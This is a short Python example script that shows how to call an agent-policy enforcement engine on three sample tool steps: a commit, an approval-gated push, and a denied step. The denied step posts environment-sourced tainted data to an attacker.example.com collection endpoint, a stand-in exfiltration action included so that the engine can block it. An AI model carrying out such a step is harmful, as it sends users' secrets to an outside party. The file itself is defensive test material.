"""
examples/evaluate_example.py – demonstrates programmatic use of the
enforcement engine from Python code rather than via the CLI.
"""

from __future__ import annotations

from pathlib import Path

import yaml  # type: ignore[import-untyped]

from awc.policy.engine import Decision, evaluate_step

REPO_ROOT = Path(__file__).resolve().parent.parent
MANIFEST_PATH = REPO_ROOT / "fixtures" / "manifests" / "repo-safe-write.yaml"


def main() -> None:
    with MANIFEST_PATH.open() as fh:
        manifest = yaml.safe_load(fh)

    # A benign step that should be ALLOWED
    benign_step = {
        "step_id": "example-001",
        "tool": "git_commit",
        "action": "write",
        "resource": "repo://local/commits",
        "input_sources": ["repo_local"],
        "tainted": False,
    }

    # An unsafe step that should be DENIED (tainted + external)
    unsafe_step = {
        "step_id": "example-002",
        "tool": "http_post",
        "action": "network_call",
        "resource": "external://attacker.example.com/collect",
        "input_sources": ["environment"],
        "tainted": True,
    }

    # A step that needs approval (push to remote)
    approval_step = {
        "step_id": "example-003",
        "tool": "git_push",
        "action": "write",
        "resource": "repo://remote/origin/main",
        "input_sources": ["repo_local"],
        "tainted": False,
    }

    for step in [benign_step, unsafe_step, approval_step]:
        decision, reason = evaluate_step(step, manifest)
        print(f"[{decision.value:>18}] {step['step_id']}: {reason[:80]}")


if __name__ == "__main__":
    main()
